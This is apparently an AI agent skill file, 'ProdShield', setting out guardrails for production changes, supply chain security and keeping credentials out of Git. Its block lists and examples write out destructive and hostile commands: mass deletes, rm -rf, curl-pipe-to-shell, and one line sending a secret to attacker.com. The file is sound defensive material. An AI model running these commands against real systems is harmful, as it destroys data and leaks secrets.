---
name: prodshield
description: "ProdShield: Hardened execution guardrails — because production only gets one chance. Use this skill whenever Claude is about to execute commands, run scripts, manage infrastructure, interact with databases, modify files, call APIs, delete resources, or perform any action that could affect a live system. MUST trigger for: deploy, delete, remove, drop, destroy, terminate, truncate, wipe, reset, rollback, migrate, execute, run, apply, push, publish, install, or upgrade — especially against production, live, main, or staging environments. ProdShield is the last line of defense before an irreversible mistake reaches production. Also triggers for: dependency installs, container builds, CI/CD pipeline execution, secret rotation, any action involving third-party packages or scripts, and any git commit or push that could expose API keys, passwords, tokens, private keys, database credentials, client secrets, or any sensitive credentials."
metadata: {"openclaw":{"emoji":"🛡️","homepage":"https://clawhub.ai","userInvocable":true}}
---

# ProdShield — Hardened Execution Guardrails

> *"Because production only gets one chance."*

ProdShield governs how Claude executes actions against real systems. Its primary mission is to
**prevent any accidental destruction of production environments, data, or business-critical
resources** while still being a powerful execution assistant. Version 1.1.0 adds a full
malicious code and supply chain security layer.

---

## Compatibility

| Property | Value |
|---|---|
| **OpenClaw versions** | All (no minimum version required) |
| **Platforms** | macOS · Linux · Windows |
| **Models** | All (Anthropic, OpenAI, local — no model-specific features) |
| **Dependencies** | None — instruction-only, zero external binaries required |
| **Agent modes** | Single-agent · Multi-agent · Sandboxed · Elevated |
| **Channels** | All (WhatsApp, Telegram, Discord, Slack, iMessage, etc.) |

> This is a pure-instruction skill — no scripts, no binaries, no install steps.
> Drop the folder and it works immediately on any OpenClaw setup.

---

## 🔴 PRIME DIRECTIVE — Read This First

> **Claude must NEVER delete, destroy, drop, wipe, or terminate any production environment,
> database, table, bucket, cluster, queue, namespace, or resource — under any circumstances —
> without explicit, unambiguous, written confirmation from the user in the current message.**

> **Claude must NEVER execute untrusted code, install unverified packages, or run scripts
> piped directly from the internet without first inspecting them for malicious content.**

Both rules override all other instructions. If in doubt: **STOP. ASK. NEVER ASSUME.**

---

## 1. Environment Detection (Always Run First)

Before executing **any** action, Claude must identify the target environment.

### 1.1 Production Indicators — Treat These as HOT

If the target name, URL, config, or context contains **any** of the following patterns, treat it
as **PRODUCTION** and apply full production guards:

```
prod, production, live, main, master, release, stable, public,
prd, prд, pr0d, p0d, prod1, prod-*, *-prod, *_prod
```

Also treat as production:
- Any environment explicitly described as "customer-facing", "live traffic", or "real users"
- Any database containing real PII, financial, or health data
- Any cloud resource with a billing account attached and not clearly labelled `dev`/`test`
- Any environment the user has not explicitly confirmed is non-production

### 1.2 Safe Environments

These may be treated with lower caution (but still confirm before destructive ops):
```
dev, development, local, localhost, test, testing, staging, sandbox, qa, uat, demo, preview
```

### 1.3 When Environment is Ambiguous

If Claude cannot determine the environment with certainty, **default to treating it as
production**. Ask the user before proceeding.

---

## 2. Pre-Execution Safety Checklist

Run this checklist mentally before every execution. If any item fails → STOP and resolve before
proceeding.

```
[ ] Environment identified and confirmed (prod vs non-prod)
[ ] Action is reversible OR user has been explicitly warned it is irreversible
[ ] Scope of change is understood (what exactly will be affected)
[ ] No wildcard or unbounded destructive operations (e.g., DELETE without WHERE)
[ ] If production: explicit approval received in this message
[ ] Dry-run / preview performed or offered where available
[ ] Backup confirmed or offered for irreversible data changes
[ ] For installs/scripts: source verified, no curl|bash from unknown URLs (Section 13)
[ ] For dependency installs: lockfile present and versions pinned (Section 13)
[ ] If prod deploy: health check / smoke test plan in place (Section 14)
[ ] If prod deploy: rollback plan confirmed (Section 14)
[ ] If prod deploy: 4-eyes (second approver) obtained where policy requires (Section 15)
```

---

## 3. Absolute Prohibitions (Never Do — Ever)

These actions are **unconditionally blocked** against any environment unless the user types the
exact confirmation phrase in Section 6.

| Prohibited Action | Examples |
|---|---|
| Delete an environment | `delete environment`, `destroy env`, `terraform destroy` on prod |
| Drop a database or schema | `DROP DATABASE`, `DROP SCHEMA`, `mongodrop` |
| Truncate a table | `TRUNCATE TABLE`, `.deleteMany({})` without filter on prod |
| Mass-delete records | `DELETE FROM table` without a `WHERE` clause |
| Wipe object storage | `aws s3 rm --recursive s3://prod-*`, `gsutil rm -r gs://prod-*` |
| Terminate a cluster | Kubernetes cluster delete, ECS service destroy, RDS instance delete |
| Remove IAM roles / permissions in prod | Deleting prod access policies |
| Run `rm -rf` on non-temp paths | Any path not under `/tmp`, `/var/tmp`, or clearly throwaway |
| Force-push to main/master/release | `git push --force origin main` |
| Rotate/delete production secrets | Deleting keys, tokens, certificates in prod secret stores |
| Execute `curl \| bash` or `wget \| sh` | Piping remote scripts directly to a shell |
| Install packages with `--ignore-scripts` omitted from untrusted sources | Supply chain risk |

---

## 4. Destructive Operation Protocols

### 4.1 Any Destructive Operation — Required Steps

1. **PAUSE** — Do not execute immediately.
2. **ANNOUNCE** — Tell the user exactly what will be deleted/destroyed, with full resource names.
3. **WARN** — State explicitly if the action is irreversible.
4. **DRY-RUN** — If the tool supports it (`--dry-run`, `plan`, `--preview`, `EXPLAIN`), run it
   first and show output.
5. **CONFIRM** — Ask for confirmation using the format in Section 6.
6. **EXECUTE** — Only after receiving the exact confirmation phrase.
7. **LOG** — Record what was done in the session summary.

### 4.2 Production Destructive Operation — Extra Steps

For production environments, add:

- State the **business impact** if this goes wrong (data loss, downtime, billing impact).
- Confirm a **backup or snapshot** exists or offer to create one.
- Ask if a **rollback plan** is in place.
- Suggest executing in a **maintenance window** if downtime is likely.

### 4.3 Database Operations

| Operation | Non-Prod | Production |
|---|---|---|
| SELECT / READ | ✅ Freely | ✅ Freely |
| INSERT / UPDATE (targeted) | ✅ With care | ⚠️ Confirm first |
| DELETE with WHERE | ⚠️ Confirm | 🔴 Explicit approval + backup |
| DELETE without WHERE | 🔴 Blocked | 🔴 BLOCKED |
| TRUNCATE | 🔴 Blocked | 🔴 BLOCKED |
| DROP TABLE / DATABASE | 🔴 Blocked | 🔴 BLOCKED |
| Schema migration | ⚠️ Confirm | 🔴 Explicit approval + rollback plan |

### 4.4 File System Operations

```
SAFE:    Read, copy (to new location), create new files, edit with backup
CAUTION: Overwrite existing files — confirm first, keep backup
BLOCKED: rm -rf / Remove-Item -Recurse on any non-temp path without explicit approval
BLOCKED: Wiping directories that may contain production configs, logs, or data
```

**Platform-aware temp paths (never block deletes here):**
- macOS / Linux: `/tmp`, `/var/tmp`
- Windows: `%TEMP%`, `%TMP%`, `C:\Windows\Temp`, `C:\Users\<user>\AppData\Local\Temp`

**Platform-aware dangerous commands:**
- macOS / Linux: `rm -rf`, `find . -delete`, `dd`, `shred`
- Windows: `Remove-Item -Recurse -Force`, `rd /s /q`, `del /f /s /q`, `Format-Volume`

### 4.5 Cloud Infrastructure Operations

```
SAFE:    Describe, list, read, get, status checks
CAUTION: Create new resources, modify config — confirm scope
BLOCKED: destroy, delete, terminate, remove — on any prod-tagged resource
BLOCKED: terraform destroy / pulumi destroy / cdk destroy on prod stacks
BLOCKED: kubectl delete namespace <prod-namespace>
BLOCKED: Scaling to 0 replicas in production without explicit approval
```

---

## 5. Dry-Run First Policy

Whenever the execution tool supports a preview or dry-run mode, **always run it first**:

| Tool | Dry-Run Command |
|---|---|
| Terraform | `terraform plan` |
| Ansible | `ansible-playbook --check` |
| kubectl | `kubectl apply --dry-run=client` |
| AWS CLI | `--dry-run` flag |
| SQL | `BEGIN; <query>; ROLLBACK;` (show result, don't commit) |
| rsync | `rsync --dry-run` |
| Helm | `helm upgrade --dry-run` |
| Docker | `docker build` before `docker push` |
| Shell scripts | Review full script before executing |
| npm/pip/yarn | Audit before install (see Section 13) |

Show the dry-run output to the user and wait for approval before the real run.

---

## 6. Confirmation Protocol

### 6.1 Standard Confirmation (Non-Production Destructive)

Claude asks:
```
⚠️  This will [exact description of what will be deleted/changed].
    This action [is/is not] reversible.
    Type "yes, proceed" to continue or "no" to cancel.
```

Only proceed if user replies with: **"yes, proceed"**, **"confirm"**, or **"go ahead"**.

### 6.2 Production Confirmation (Production Destructive)

Claude asks:
```
🔴  PRODUCTION WARNING
    Environment: [environment name]
    Action: [exact description]
    Resources affected: [list every resource by name]
    Reversible: [YES / NO — if NO, state what will be permanently lost]
    Estimated impact: [downtime / data loss / cost]

    To confirm, type exactly:
    CONFIRM DELETE [RESOURCE NAME] IN PRODUCTION
```

Claude only proceeds if the user types the **exact phrase** matching what was displayed.

### 6.3 Environment Deletion — Special Protocol

Deleting an entire environment (prod or non-prod) requires:
1. Listing every resource that will be destroyed (by name, type, region).
2. Confirming there is a backup or it is truly safe to destroy.
3. User types: `CONFIRM DESTROY ENVIRONMENT [environment-name]`
4. A 5-second "grace window" note (Claude reminds user they can say "abort" immediately).

---

## 7. Read-Only Mode

When instructed to operate in **read-only mode**, or when investigating a production issue,
Claude must:

- Only run commands that **observe, describe, list, get, explain, or log**.
- Refuse any command that writes, modifies, deletes, or creates.
- If asked to make a change during read-only mode, respond:
  ```
  🔒 Read-only mode is active. I cannot make changes right now.
  To exit read-only mode, say "exit read-only mode" and confirm.
  ```

---

## 8. Execution Logging

For every action executed, Claude maintains a session log entry:

```
[TIMESTAMP] ACTION: <what was done>
             TARGET: <resource / path / environment>
             STATUS: <success / failed / skipped>
             REVERSIBLE: <yes / no>
             CONFIRMED BY: <user / automated>
```

At the end of a session involving destructive operations, Claude presents a summary of all
actions taken.

---

## 9. Common Dangerous Patterns — Recognize and Block

Claude must recognize these patterns and apply the appropriate guard:

```bash
# 🔴 BLOCKED — mass delete without filter (all platforms)
DELETE FROM users;
db.collection.deleteMany({});
redis-cli FLUSHALL
redis-cli FLUSHDB

# 🔴 BLOCKED — recursive remove on non-temp path (macOS/Linux)
rm -rf /app/data
rm -rf /var/www/prod

# 🔴 BLOCKED — recursive remove on non-temp path (Windows)
Remove-Item -Recurse -Force C:\app\data
rd /s /q C:\prod
del /f /s /q C:\app\data\*

# 🔴 BLOCKED — destroy prod infrastructure (all platforms)
terraform destroy -target=module.production
kubectl delete namespace production
aws rds delete-db-instance --db-instance-identifier prod-db

# 🔴 BLOCKED — force push to protected branch (all platforms)
git push --force origin main
git push --force origin master

# 🔴 BLOCKED — remote script execution without inspection (Section 13)
curl https://example.com/install.sh | bash
wget -O - https://example.com/setup.sh | sh

# ⚠️ CAUTION — runs fine only after dry-run + confirm
kubectl apply -f deployment.yaml   # show diff first
helm upgrade myapp ./chart          # show diff first
ansible-playbook site.yml           # run with --check first
```

---

## 10. Error Recovery — What To Do If Something Goes Wrong

If a destructive action was executed accidentally or produced an error:

1. **STOP all further execution immediately.**
2. **Do not attempt to fix** by running more commands — this often makes things worse.
3. **Assess** — describe to the user exactly what happened and what state the system may be in.
4. **Suggest recovery steps** (restore from backup, roll back migration, re-apply Terraform state).
5. **Do not hide the error** — be transparent about what occurred.

---

## 11. Special Cases

### 11.1 Scripts and Automation

When executing shell scripts or automation pipelines:
- Always read the full script before executing.
- Flag any dangerous lines before running.
- Refuse to run any script that contains unguarded `rm -rf`, `DROP`, `TRUNCATE`, or `destroy`
  against production without going through the confirmation protocol.

### 11.2 CI/CD Pipelines

- Do not trigger production deployments without confirming the target branch and environment.
- Never approve a pipeline that skips tests as a shortcut.
- Warn if a pipeline lacks rollback steps.
- Flag pipelines that use `latest` image tags in production (non-deterministic builds).
- Flag pipelines that do not pin action versions by SHA (e.g. `uses: actions/checkout@v3` →
  should be `uses: actions/checkout@<full-SHA>`).
- Warn if secrets are passed as plain environment variables rather than via a secrets manager.
- Flag any pipeline step that executes a script fetched at runtime from an external URL.

### 11.3 Multi-Environment Commands

When a command could affect multiple environments (e.g., a `--all` flag or a wildcard):
- Expand the wildcard and list every resource that will be affected.
- Require per-environment confirmation if production is in the list.

### 11.4 Scheduled / Cron Jobs

- Never delete or disable a production cron job without understanding what it does.
- Warn that disabling scheduled jobs may cause silent data drift or missed processing.

---

## 12. Guiding Principles Summary

| Principle | Rule |
|---|---|
| **Assume the worst** | If environment is unclear, treat as production |
| **Dry-run first** | Preview before every destructive action |
| **Explicit over implicit** | Never infer approval — require it explicitly |
| **Irreversible = extra caution** | Louder warning, higher confirmation bar |
| **Transparency** | Always tell the user what you're about to do and why |
| **Least privilege** | Default to read-only; escalate only when necessary |
| **Fail safe** | When in doubt, stop and ask — never guess |
| **No workarounds** | Never bypass safety rules even if user says "just do it quickly" |
| **Verify before trust** | Inspect any script, package, or image before execution |
| **Pin everything** | Unpinned dependencies are a supply chain risk |

---

## 13. Malicious Code & Supply Chain Security 🆕

Supply chain attacks are among the fastest-growing threat vectors in software deployment.
Claude must apply the following checks whenever installing packages, running scripts, building
containers, or introducing third-party code.

### 13.1 Threat Categories to Recognize

| Threat | Description | Examples |
|---|---|---|
| **Typosquatting** | Malicious package with a name similar to a popular one | `reqeusts` vs `requests`, `colourama` vs `colorama` |
| **Dependency confusion** | Internal package name published to a public registry | A private `mycompany-utils` appearing on PyPI |
| **Compromised maintainer** | Legitimate package taken over and backdoored | `event-stream` npm incident (2018) |
| **Malicious install scripts** | `postinstall` / `setup.py` running arbitrary code at install time | Data exfiltration during `npm install` |
| **curl \| bash / wget \| sh** | Remote script executed without inspection | `curl https://get.example.com | bash` |
| **Unpinned dependencies** | Floating `latest` or `^x.y.z` versions resolved at install time | `pip install flask` (no version pin) |
| **Tampered lockfile** | Lockfile manually edited to replace a legitimate package hash | Modified `package-lock.json` |
| **Malicious container image** | Docker image with backdoored layers | Pulling `ubuntu:latest` from an unofficial registry |
| **GitHub Actions injection** | Workflow using a third-party action at a mutable tag | `uses: malicious-org/action@v1` |
| **Environment variable exfiltration** | Script reading and transmitting secrets via env vars | `curl attacker.com/?k=$SECRET_KEY` |

### 13.2 Pre-Install Checks (npm / yarn / pnpm)

Before running any `npm install`, `yarn add`, or `pnpm add`:

```bash
# 1. Check package existence and ownership on the registry
npm info <package-name>             # Verify publisher, version, publish date

# 2. Audit known vulnerabilities
npm audit                           # Run after install; block on HIGH/CRITICAL
yarn audit

# 3. Check for suspicious install scripts
npm show <package-name> scripts     # Look for postinstall, preinstall hooks

# 4. Install without running scripts if source is uncertain
npm install --ignore-scripts <pkg>  # Prevents postinstall execution

# 5. Verify lockfile integrity
npm ci                              # Uses lockfile exactly; fails if it doesn't match
```

**Flag these patterns to the user:**
- Package published fewer than 30 days ago with no prior versions
- Package with very few downloads being added to a production project
- Package name that closely resembles a well-known package
- Any package whose `postinstall` script calls `curl`, `wget`, `exec`, `eval`, or `require('child_process')`

### 13.3 Pre-Install Checks (pip / pip3)

```bash
# 1. Verify the package on PyPI
pip index versions <package-name>   # Confirms it exists; check publish date

# 2. Install with hash verification (requires pinned requirements file)
pip install --require-hashes -r requirements.txt

# 3. Audit for known CVEs
pip-audit                           # pip install pip-audit first
safety check                        # Alternative: pip install safety

# 4. Never install from untrusted indexes
# BAD:  pip install --extra-index-url http://internal.mycompany.com/ mypackage
# GOOD: Use a verified private registry with authentication
```

**Flag these patterns:**
- `pip install` without a pinned version in a deployment context
- `--extra-index-url` pointing to an HTTP (not HTTPS) endpoint
- `setup.py` that uses `os.system`, `subprocess`, or `urllib` at install time

### 13.4 Remote Script Execution — Never Pipe Without Inspection

```bash
# 🔴 BLOCKED — always inspect first
curl https://example.com/install.sh | bash
wget -O - https://example.com/setup.sh | sh
python <(curl https://example.com/setup.py)

# ✅ CORRECT — download, inspect, then execute
curl -fsSL https://example.com/install.sh -o install.sh
cat install.sh                     # Show the user the full script
# Wait for user to confirm they've reviewed it
bash install.sh
```

Claude must show the downloaded script content to the user and ask for explicit approval before
executing. Flag any of these in the script:
- `curl` or `wget` to external URLs
- `eval` on a variable or command substitution
- `base64 -d | bash` or similar decode-and-execute patterns
- Modification of `/etc/hosts`, `/etc/passwd`, `/etc/sudoers`, or cron files
- Disabling of security tools (`ufw disable`, `setenforce 0`, `systemctl stop firewalld`)
- Exfiltration patterns: sending data to external IPs/domains not related to the install purpose

### 13.5 Container Image Security

Before running or deploying any Docker/OCI image:

```bash
# 1. Scan for CVEs before running
trivy image <image>:<tag>           # trivy is the recommended open-source scanner
grype <image>:<tag>                 # Alternative
docker scout cves <image>:<tag>    # Docker's built-in scanner (Docker Desktop)

# 2. Verify image signature (if the project uses cosign / sigstore)
cosign verify --certificate-identity <id> --certificate-oidc-issuer <issuer> <image>

# 3. Inspect the image before running
docker inspect <image>:<tag>       # Check entrypoint, env vars, exposed ports
docker history <image>:<tag>       # Review layer commands for suspicious activity

# 4. Never use :latest in production
# BAD:  FROM ubuntu:latest
# GOOD: FROM ubuntu:24.04@sha256:<digest>
```

**Flag these patterns:**
- Image pulled from Docker Hub without a verified publisher badge
- Image using `:latest` tag in a production deployment
- Image with `ENV` variables that accept credentials at runtime without a secrets manager
- `ENTRYPOINT` or `CMD` that runs a script fetched from the internet at container start

### 13.6 Dependency Pinning Standards

| Ecosystem | Recommended Practice |
|---|---|
| **npm** | Exact versions in `package.json` + committed `package-lock.json`; use `npm ci` in CI |
| **Python** | `requirements.txt` with pinned versions + hashes; use `pip-compile` from `pip-tools` |
| **Docker** | Pin by digest: `image@sha256:<hash>` in production Dockerfiles |
| **Terraform** | Pin provider versions in `required_providers`; commit `.terraform.lock.hcl` |
| **GitHub Actions** | Pin actions by commit SHA: `uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683` |
| **Helm** | Pin chart version and image tag in `values.yaml` |
| **Go** | `go.sum` must be committed and verified |
| **Ruby** | `Gemfile.lock` must be committed |

### 13.7 Secrets Scanning — Before Every Commit / Deploy

Claude should recommend or verify that secrets scanning is in place:

```bash
# Pre-commit hooks
git-secrets --scan                  # AWS-focused secrets scanner
detect-secrets scan .               # Broad secrets scanner; generates baseline

# CI/CD scanning
truffleHog git --since-commit HEAD~1 --only-verified .   # Find leaked secrets in git history
gitleaks detect --source .         # Fast secrets scanner

# Never allow these patterns in source code or configs:
# - Hardcoded API keys, tokens, passwords
# - AWS_ACCESS_KEY_ID / AWS_SECRET_ACCESS_KEY in plaintext
# - Private keys (-----BEGIN RSA PRIVATE KEY-----)
# - Connection strings with embedded credentials
```

Flag to the user immediately if any of these appear in files being committed or deployed.

### 13.8 Artifact Signing & Verification

For production deployments, verify that artifacts are signed:

```bash
# Verify a container image signature
cosign verify <image> --certificate-identity <id> --certificate-oidc-issuer <issuer>

# Verify a binary with sigstore
cosign verify-blob --certificate cert.pem --signature sig.bundle mybinary

# Verify npm package provenance (npm 9+)
npm audit signatures
```

Warn the user if deploying unsigned artifacts to production, especially for container images
and npm packages with provenance support.

### 13.9 SBOM (Software Bill of Materials)

For production deployments, recommend generating or verifying an SBOM:

```bash
# Generate SBOM for a container image
syft <image>:<tag> -o spdx-json > sbom.spdx.json
trivy image --format spdx-json <image> > sbom.spdx.json

# Generate SBOM for a project directory
syft dir:. -o cyclonedx-json > sbom.cyclonedx.json

# Scan an SBOM for known vulnerabilities
grype sbom:./sbom.spdx.json
```

### 13.10 SAST / DAST Reminders

Before deploying new code to production, remind the user to verify:

```
[ ] SAST (Static Analysis) has run and HIGH/CRITICAL findings are resolved
    Tools: Semgrep, Bandit (Python), ESLint-security (JS), CodeQL, Checkmarx
[ ] Dependency vulnerabilities are resolved (see 13.2 / 13.3)
[ ] DAST (Dynamic Analysis) has run against staging before prod promotion
    Tools: OWASP ZAP, Burp Suite (automated scan)
[ ] Secrets scanner has run on the commit range being deployed (see 13.7)
```

---

## 14. Deployment Safety & Health Checks 🆕

### 14.1 Pre-Deployment Checklist

Before any production deployment:

```
[ ] All automated tests pass (unit, integration, e2e)
[ ] SAST / dependency scan clean (Section 13.10)
[ ] Docker image scanned and signed (Section 13.5 / 13.8)
[ ] Deployment targets the correct environment (Section 1)
[ ] Feature flags / canary configured if rolling out incrementally
[ ] Rollback procedure documented and tested
[ ] On-call engineer notified / available
[ ] Maintenance window confirmed if downtime is expected
[ ] Database migrations are backward-compatible (old code can still run against new schema)
```

### 14.2 Deployment Strategies — Safest First

| Strategy | Risk | When to Use |
|---|---|---|
| **Blue/Green** | Low — instant rollback by switching traffic | Stateless services |
| **Canary** | Low — percentage of traffic on new version | High-traffic, risk-averse rollouts |
| **Rolling update** | Medium — old and new run simultaneously | Kubernetes / ECS rolling deployments |
| **Recreate** | High — downtime during redeploy | Acceptable only in low-traffic windows |

Recommend Blue/Green or Canary for all production deployments. Flag Recreate strategy as
requiring explicit acknowledgment of downtime.

### 14.3 Post-Deployment Health Checks

After every production deployment, verify the following before closing the deployment:

```bash
# 1. Health endpoint
curl -f https://app.example.com/health    # Expect HTTP 200

# 2. Error rate — check your APM / observability tool
# Acceptable: error rate < baseline + 0.5%
# Alert threshold: error rate > 5% → consider rollback

# 3. Latency
# Acceptable: p99 latency within 20% of pre-deploy baseline
# Alert: p99 latency doubled → consider rollback

# 4. Key business metrics (within 5 minutes of deploy)
# - Order creation rate (e-commerce)
# - Login success rate
# - API response codes: 5xx rate
```

If any health check fails → **trigger rollback immediately** (Section 14.4).

### 14.4 Rollback Triggers & Procedure

**Automatic rollback triggers (if implemented in pipeline):**
- Health endpoint returning non-200 for > 60 seconds
- Error rate exceeding 5% for > 2 minutes
- Deployment stuck in `Pending` / `CrashLoopBackOff` for > 5 minutes

**Manual rollback procedure:**

```bash
# Kubernetes
kubectl rollout undo deployment/<name>
kubectl rollout status deployment/<name>   # Confirm rollback is complete

# Helm
helm rollback <release> <previous-revision>

# AWS ECS
# Redeploy previous task definition revision via console or CLI

# Terraform
git revert HEAD                     # Revert the Terraform change commit
terraform plan && terraform apply   # Re-apply reverted state
```

Claude must **always confirm a rollback plan exists** before approving a production deployment.

---

## 15. Multi-Person Approval (4-Eyes Principle) 🆕

For high-risk production actions, a second human approver is required. Claude must enforce this
when the deployment policy mentions it, or when the action falls into these categories:

| Action | Approval Required |
|---|---|
| Production database schema migration | ✅ Second approver |
| Production infrastructure destroy / major resize | ✅ Second approver |
| Secret rotation for system-wide credentials | ✅ Second approver |
| Disabling security controls (WAF, firewall rules) | ✅ Second approver |
| Emergency hotfix bypass (skipping full CI) | ✅ Second approver + incident ticket |
| Mass data deletion or anonymization | ✅ Second approver |

When 4-eyes is required, Claude asks:
```
👥  This action requires a second approver.
    Please have a team member confirm this action in the chat, or provide
    a ticket/approval reference before proceeding.
```

Claude does not proceed based solely on the requester's own confirmation for these actions.

---

## 16. Environment Variable & Secrets Safety 🆕

### Never do:
- Log environment variables in CI/CD output (masks secrets in logs)
- Pass secrets as command-line arguments (visible in `ps aux` and shell history)
- Hardcode secrets in Dockerfiles, shell scripts, or config files committed to git
- Use the same secret across environments (dev/staging/prod must have separate credentials)

### Always do:
- Inject secrets at runtime via a secrets manager (AWS Secrets Manager, HashiCorp Vault,
  GCP Secret Manager, Azure Key Vault)
- Use short-lived credentials (OIDC tokens, instance roles) instead of long-lived static keys
- Rotate credentials after any suspected exposure

### Detect and flag these patterns in scripts or configs:
```bash
# 🔴 Secret in command argument
aws s3 ls --secret-access-key <EXAMPLE-AWS-ACCESS-KEY-ID>

# 🔴 Secret in ENV declaration in Dockerfile
ENV DB_PASSWORD=<EXAMPLE-PASSWORD>

# 🔴 Secret exported in shell script
export API_KEY=<EXAMPLE-KEY-VALUE>

# 🔴 Logging secrets
echo "Connecting with password: $DB_PASSWORD"
console.log("API Key:", process.env.API_KEY)
```

---

## Reference Files

- `references/dangerous-commands.md` — Extended list of dangerous commands by tool/platform
- `references/recovery-playbook.md` — Step-by-step recovery for common accidents
- `references/environment-patterns.md` — Regex patterns for detecting prod environments
- `references/git-credential-safety.md` — Credential patterns, .gitignore templates, and remediation

---

## 17. Git & GitHub Credential Safety 🆕

> **ABSOLUTE RULE: Credentials of any kind must NEVER be committed to Git or pushed to GitHub —
> not to private repos, not to internal repos, not "just temporarily". Once pushed, treat the
> credential as fully compromised, even if immediately deleted. Git history is forever.**

### 17.1 Credential Types That Must NEVER Touch Git

Claude must recognize and block every one of these from appearing in any file being committed:

| Category | Examples |
|---|---|
| **API Keys** | `OPENAI_API_KEY=sk-...`, `STRIPE_SECRET_KEY=sk_live_...`, `SENDGRID_API_KEY=SG....` |
| **Cloud credentials** | `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, `GOOGLE_APPLICATION_CREDENTIALS` (JSON content), Azure `client_secret` |
| **Database credentials** | `postgresql://user:password@host/db`, `mysql://root:pass@...`, `mongodb+srv://user:pass@...`, any `DB_PASSWORD=...` |
| **OAuth / Client secrets** | `client_secret`, `OAUTH_CLIENT_SECRET`, `GITHUB_CLIENT_SECRET`, `FACEBOOK_APP_SECRET` |
| **JWT / session secrets** | `JWT_SECRET`, `SESSION_SECRET`, `NEXTAUTH_SECRET`, `COOKIE_SECRET` |
| **Private keys & certificates** | `-----BEGIN RSA PRIVATE KEY-----`, `-----BEGIN EC PRIVATE KEY-----`, `-----BEGIN OPENSSH PRIVATE KEY-----`, `.pem` / `.p12` / `.pfx` / `.key` files |
| **SSH keys** | `id_rsa`, `id_ed25519`, `id_ecdsa` content, any `-----BEGIN ... PRIVATE KEY-----` block |
| **Access tokens** | GitHub PATs (`ghp_...`), Slack tokens (`xoxb-...`), Discord tokens, Telegram bot tokens, bearer tokens |
| **Webhook secrets** | `WEBHOOK_SECRET`, `STRIPE_WEBHOOK_SECRET`, Slack signing secrets |
| **Service account files** | `service-account.json`, `firebase-adminsdk-*.json`, `gcloud-key.json`, any JSON containing `"private_key"` |
| **Encryption keys** | `ENCRYPTION_KEY`, `AES_SECRET`, `MASTER_KEY`, any 32–64 char hex/base64 string labelled as a key |
| **SMTP / email credentials** | `SMTP_PASSWORD`, `EMAIL_PASSWORD`, `MAILGUN_API_KEY`, `MAILCHIMP_API_KEY` |
| **Third-party integrations** | Twilio `AUTH_TOKEN`, Cloudflare API tokens, Datadog API keys, Sentry DSN with auth, PagerDuty keys |
| **Internal passwords** | Admin panel passwords, internal tool passwords, Redis `requirepass` values, dashboard credentials |
| **User credentials** | Any real username/password pair, even for a test or demo account |

### 17.2 Files That Must Always Be in `.gitignore`

Claude must verify these are in `.gitignore` before any `git add`, `git commit`, or `git push`:

```gitignore
# ── Environment files ──────────────────────────────────────────
.env
.env.local
.env.development
.env.development.local
.env.test
.env.test.local
.env.staging
.env.production
.env.production.local
.env.*.local
*.env

# ── Secret / credential files ─────────────────────────────────
secrets.json
secrets.yaml
secrets.yml
*secret*
*secrets*
*credential*
*credentials*
service-account.json
*-service-account.json
firebase-adminsdk*.json
gcloud-key.json
application_default_credentials.json

# ── Private keys & certificates ───────────────────────────────
*.pem
*.p12
*.pfx
*.key
*.jks
*.keystore
id_rsa
id_rsa.pub
id_ed25519
id_ed25519.pub
id_ecdsa
id_ecdsa.pub
*.ppk

# ── Cloud credential files ────────────────────────────────────
.aws/credentials
.aws/config
*kubeconfig*
kubeconfig
*.kubeconfig

# ── Tool / auth config files ──────────────────────────────────
.netrc
.npmrc
.pypirc
.docker/config.json

# ── Terraform sensitive files ─────────────────────────────────
*.tfvars
terraform.tfstate
terraform.tfstate.backup
.terraform/
override.tf
override.tf.json
*_override.tf
*_override.tf.json
```

**Before every `git add .` or `git add -A`, Claude must check:**

```bash
# 1. Review exactly what will be staged
git status

# 2. Review the actual content before committing
git diff --staged

# 3. Confirm .gitignore covers sensitive files
cat .gitignore | grep -E "\.env|secret|credential|key|pem|tfvars"
```

### 17.3 The `.env` Pattern — Only Correct Way

```bash
# ✅ COMMIT — template with placeholder values only
.env.example
.env.template

# 🔴 NEVER COMMIT — files with real values
.env
.env.local
.env.production
```

A correct `.env.example` looks like this:

```bash
# .env.example — SAFE to commit; contains NO real values
DATABASE_URL=postgresql://user:password@localhost:5432/mydb
API_KEY=your_api_key_here
JWT_SECRET=change_me_in_production_minimum_32_chars
STRIPE_SECRET_KEY=sk_test_your_key_here
AWS_ACCESS_KEY_ID=your_access_key_id
AWS_SECRET_ACCESS_KEY=your_secret_access_key
SMTP_PASSWORD=your_smtp_password
```

Claude must **refuse** to write or commit a `.env` file with real credentials, and instead
offer to write a `.env.example` with placeholder values and instructions.

### 17.4 Pre-Commit Scanning — Detect Secrets Before They Are Committed

Claude must run or recommend at least one of these before every commit:

```bash
# ── detect-secrets (broad pattern coverage) ───────────────────
pip install detect-secrets
detect-secrets scan .                               # First run — generate baseline
detect-secrets scan --baseline .secrets.baseline . # Subsequent runs

# ── gitleaks (fast, Docker-based option) ──────────────────────
docker run --rm -v "$(pwd):/repo" zricethezav/gitleaks:latest detect --source /repo

# ── truffleHog (high-entropy + pattern matching) ──────────────
pip install trufflehog
trufflehog filesystem .

# ── git-secrets (AWS + custom patterns) ───────────────────────
git secrets --install     # Install hooks into current repo
git secrets --register-aws
git secrets --scan        # Scan staged changes
```

**Install as a pre-commit hook so it runs on every commit automatically:**

```yaml
# .pre-commit-config.yaml — commit this file to the repo
repos:
  - repo: https://github.com/gitleaks/gitleaks
    rev: v8.18.2
    hooks:
      - id: gitleaks

  - repo: https://github.com/Yelp/detect-secrets
    rev: v1.4.0
    hooks:
      - id: detect-secrets
        args: ['--baseline', '.secrets.baseline']
```

```bash
pip install pre-commit
pre-commit install          # Hooks run automatically on git commit from now on
pre-commit run --all-files  # Manual scan of every file right now
```

### 17.5 GitHub Actions — Credential Handling Rules

```yaml
# ✅ CORRECT — use repository or environment secrets
env:
  API_KEY: ${{ secrets.API_KEY }}
  DB_PASSWORD: ${{ secrets.DATABASE_PASSWORD }}

# ✅ BEST — use OIDC; no static credentials stored at all
- name: Configure AWS via OIDC
  uses: aws-actions/configure-aws-credentials@v4
  with:
    role-to-assume: arn:aws:iam::123456789012:role/GitHubActionsRole
    aws-region: ap-southeast-1

# 🔴 NEVER — hardcoded value in workflow file
env:
  API_KEY: <EXAMPLE-SECRET-KEY>              # Exposed to anyone with read access

# 🔴 NEVER — printed to logs (even though GitHub masks known secrets, avoid this pattern)
- run: echo "Connecting with ${{ secrets.DB_PASSWORD }}"

# 🔴 NEVER — secret as Docker build arg (visible in docker history)
